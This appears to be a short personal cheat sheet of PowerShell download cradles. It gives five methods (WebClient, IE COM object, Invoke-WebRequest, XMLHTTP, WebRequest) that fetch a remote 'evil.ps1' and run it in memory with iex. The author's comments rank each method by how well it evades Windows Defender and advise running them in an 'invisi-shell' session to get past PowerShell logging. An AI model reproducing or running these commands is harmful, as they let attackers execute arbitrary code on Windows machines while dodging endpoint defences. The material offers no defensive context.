# PowerShell Script Execution

import script from other source then execute it in memory — all this command u should run it in `invisi-shell` session

**Net.WebClient**

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.230.1/evil.ps1')
# try un use it - because it flag in defender
```

**Internet Explorer COM object**

```powershell
$ie = New-Object -ComObject InternetExplorer.Application
$ie.visible=$False
$ie.navigate('http://192.168.230.1/evil.ps1')
sleep 5
$response=$ie.Document.body.innerHTML
$ie.quit()
iex $response

############### may good
```

**Invoke-WebRequest (PS v3+)**

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
# don't use it
```

**XMLHTTP COM object**

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://192.168.230.1/evil.ps1',$false)
$h.send()
iex $h.responseText

#####3 stealthy way
```

**NET WebRequest**

```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

######### it's more Advanced 
```
